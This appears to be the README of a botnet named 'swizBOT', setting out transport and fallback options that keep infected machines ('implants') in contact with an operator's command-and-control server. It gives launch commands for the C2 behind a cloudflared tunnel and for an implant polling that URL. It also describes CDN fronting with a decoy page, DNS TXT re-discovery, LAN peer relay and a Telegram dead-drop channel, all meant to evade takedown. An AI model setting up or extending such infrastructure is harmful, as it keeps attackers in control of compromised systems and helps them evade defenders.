# swizBOT — transport options (C2 redundancy)

The swizBOT implant is endpoint-agnostic: it polls a list of C2
URLs in random order and fails over across layers. Nothing in the
client depends on a specific tunnel provider. Pick any option below
and point implants at the public URL with `SWIZ_C2_URLS`; pair every
public exposure with `-token` and `-bot-secret`.

## Layer summary (implant fallback order)

1. Primary HTTPS endpoints (`SWIZ_C2_URLS`) — your own TLS host or a
   tunnel URL, tried in random order.
2. DNS TXT discovery (`SWIZ_DNS_DOMAIN`) — operator-controlled domain
   publishes additional endpoints; checked at boot and hourly.
3. LAN peer discovery (`SWIZ_P2P=1`) — UDP broadcast; other implants
   share their C2 list, so a cut-off fleet re-finds the operator
   through any peer that still has a live route. See docs/P2P.md.
4. Telegram dead drop (`SWIZ_TELEGRAM_TOKEN`) — last-resort command
   channel when every network path to the C2 is gone.
5. Local result cache — results are stored while offline and flushed
   on the next successful contact.

## 1. cloudflared quick tunnel (built in, zero account)

The C2 server spawns a quick tunnel itself:

```bash
./bin/swizbot-c2 -ui :8080 -listen :8443 -tunnel cloudflared \
  -token 'op-secret' -bot-secret 'shared-secret' \
  -cert server.crt -key server.key
```

It prints the public `https://<random>.trycloudflare.com` URL once
the tunnel is up. The implant protocol is plain HTTP(S) polling, so
the whole fleet plus the dashboard ride the same URL:

```bash
SWIZ_C2_URLS=https://<random>.trycloudflare.com \
SWIZ_BOT_SECRET=*** ./bin/swizbot-bot-linux
```

Hostnames are random per start; for a fixed hostname use a named
cloudflared tunnel or a direct host. Requires `cloudflared` on PATH.

## 2. Direct VPS with TLS (no third party)

Run behind Caddy or nginx on 443, or let the C2 terminate TLS
itself (`-cert`/`-key`, the default `-listen :8443`). Caddy
one-liner:

```
your-domain.example {
    reverse_proxy 127.0.0.1:8443
}
```

Keep the listener bound to 127.0.0.1 when a front proxy is used.
Implants set `SWIZ_C2_URLS=https://your-domain.example:8443`
(or :443 when the proxy fronts it).

## 3. CDN fronting (Cloudflare Worker) for the full fleet

`deploy/cloudflare_worker.js` routes on the Host header: requests for
your hidden hostname are forwarded to the swizBOT origin; everyone
else gets a decoy page. Set env `C2_HOST` and `BACKEND_URL`, deploy
with `wrangler`, and implants use
`SWIZ_C2_URLS=https://<your-cdn-domain>`.

Because the implant channel is HTTP polling (not WebSocket), the
worker fronts checkin/result for the fleet and the operator API
without extra bridging. The dashboard `/ws` stream needs the
WebSocket-origin pattern if you want live UI updates through the
worker; polling fallback in the dashboard covers it otherwise.

## 4. DNS TXT as dynamic re-discovery

Point `SWIZ_DNS_DOMAIN` at a TXT record you control containing one or
more `https://` endpoints. When primary endpoints die, implants pick
up the new operator address from DNS within the hour:

```
dig TXT c2.example.com
c2.example.com. 300 IN TXT "https://current-c2.example.net:8443"
```

## 5. LAN P2P as the last network layer

`SWIZ_P2P=1` enables the UDP peer discovery (port 31337 by default).
Implants broadcast their endpoint list on the LAN and answer peers.
This keeps a fleet reachable when external paths are cut but any
single implant still has a route. Plaintext/unauthenticated by
design - it is a fallback, not a trust boundary (docs/P2P.md).

## 6. Telegram dead drop

With `SWIZ_TELEGRAM_TOKEN` (and optional `SWIZ_TELEGRAM_CHAT_ID`),
implants fall back to polling a Telegram channel for JSON commands
when every endpoint is unreachable. Lowest bandwidth, highest
latency - the last-resort command lane.
